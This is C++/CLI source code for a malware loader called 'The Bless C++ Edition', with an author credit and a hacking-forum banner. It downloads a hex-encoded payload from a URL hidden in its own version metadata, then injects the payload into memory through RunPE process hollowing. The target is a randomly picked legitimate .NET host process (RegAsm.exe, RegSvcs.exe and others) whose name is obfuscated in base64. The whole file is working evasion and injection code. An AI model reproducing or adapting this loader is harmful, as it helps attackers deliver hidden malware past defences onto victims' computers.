#include "stdafx.h"  
 

using namespace System;
using namespace System::Net;
using namespace System::IO;
using namespace System::Collections;
using namespace System::Reflection;
using namespace System::Collections::Generic;
/*
	   _          (`-.
	   \`----.    ) ^_`)
,__     \__   `\_/  ( `     ///////////////////////////////////////////////////////
 \_\      \__  `|   }      //              The Bless C++ Edition                //
   \\  .--' \__/    }     //          Coded By Antidote | Ax0nes.com           //
	))/   \__,<  /_/     // Since ancient Egypt, we continue to cryptography. //
	((|  _/_/ `\ \_\_   ///////////////////////////////////////////////////////
	 `\_____\\  )__\_\

--------------------------
 Last Updated : 27/03/2019
*/
 

// Hex To Byte
array<Byte> ^Hex2Byte(String ^Hex)
{
	List<Byte> ^hdbcpgrd_mfs = gcnew List<Byte>();
	for (int i = 0; i < Hex->Length; i += 2)
	{
		hdbcpgrd_mfs->Add(Byte::Parse(Hex->Substring(i, 2), Globalization::NumberStyles::HexNumber));
	}
	return hdbcpgrd_mfs->ToArray();
}
 
// Base64  Decode
String ^Base64(String ^data)
{ //lol not base128 . this function base64
	try
	{
		System::Text::UTF8Encoding ^encoder = gcnew System::Text::UTF8Encoding();
		System::Text::Decoder ^utf8Decode = encoder->GetDecoder();
		array<Byte> ^todecode_byte = Convert::FromBase64String(data);
		int charCount = utf8Decode->GetCharCount(todecode_byte, 0, todecode_byte->Length);
		array<Char> ^decoded_char = gcnew array<Char>(charCount);
		utf8Decode->GetChars(todecode_byte, 0, todecode_byte->Length, decoded_char, 0);
		String ^result = gcnew String(decoded_char);
		return result;
	}
	catch (Exception ^e)
	{
		throw gcnew Exception("Error in base64Decode" + e->Message);
	}
}

String ^RussianRoulette() { //Random Procces Hook for Memory Inject

	Random ^rnd = gcnew Random();
	int rlt = rnd->Next(1, 5);
	ArrayList ^Lucky = gcnew ArrayList();
	Lucky->Add("UmVnYXNtLmV4ZQ==");  // RegAsm.exe
	Lucky->Add("UmVnU3Zjcy5leGU="); // RegSvcs.exe
	Lucky->Add("Y3Z0cmVzLmV4ZQ=="); // cvtres.exe
	Lucky->Add("anNjLmV4ZQ=="); // jsc.exe
	Lucky->Add("YXNwbmV0X2NvbXBpbGVyLmV4ZQ=="); // aspnet_compiler.exe
	Lucky->Add("UmVnYXNtLmV4ZQ=="); // RegAsm.exe
	return  dynamic_cast<String^>(Lucky[rlt]);
}

String ^WebToHex() { // Get Shellcode
		String ^path = System::IO::Directory::GetCurrentDirectory() + "\\" + Process::GetCurrentProcess()->ProcessName + ".exe";
		auto versionInfo = FileVersionInfo::GetVersionInfo(Assembly::GetEntryAssembly()->Location);
		auto companyName = versionInfo->ProductName; // get url assembly product name
		String ^STR_DATA;
		//----- | Webclient
		WebClient ^iflwfiwe_ebe = gcnew WebClient();
		iflwfiwe_ebe->Headers->Add(safe_cast<Char>(117) + safe_cast<Char>(115) + safe_cast<Char>(101) + safe_cast<Char>(114) + safe_cast<Char>(45) + safe_cast<Char>(97) + safe_cast<Char>(103) + safe_cast<Char>(101) + safe_cast<Char>(110) + safe_cast<Char>(116) + String::Empty, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
		Stream ^iusgmuoa_iwu = iflwfiwe_ebe->OpenRead(companyName);
		StreamReader ^akternvu_dxa = gcnew StreamReader(iusgmuoa_iwu);
		STR_DATA = akternvu_dxa->ReadToEnd();
		iusgmuoa_iwu->Close();
		akternvu_dxa->Close();
		return STR_DATA;
}

// Main Controller
int main(array<System::String ^> ^args)
{
	try
	{
	
		array <Byte> ^fileBytes = Hex2Byte(WebToHex()); // Hex To Bye
		//------ | Memory 
		bool MInject = RunPE::Run(IO::Path::Combine(Runtime::InteropServices::RuntimeEnvironment::GetRuntimeDirectory(), Base64(RussianRoulette())), nullptr, fileBytes, true);
		//------ | Memory End
		if (MInject==true) // Controller 
		{
			Console::WriteLine("Memory Injection Successfully.");
		}
		else {
			Console::WriteLine("Memory Injection Failed.");
		}
		Console::ReadKey();
		return 0;
	}
	catch (const std::exception&)
	{
		
	}
	
}
// Extra
/*
Hook List
1-) RegAsm.exe  : UmVnYXNtLmV4ZQ==
2-) RegSvcs.exe : UmVnU3Zjcy5leGU=
3-) cvtres.exe : Y3Z0cmVzLmV4ZQ==
4-) jsc.exe : anNjLmV4ZQ==
5-) aspnet_compiler.exe : YXNwbmV0X2NvbXBpbGVyLmV4ZQ==
*/
 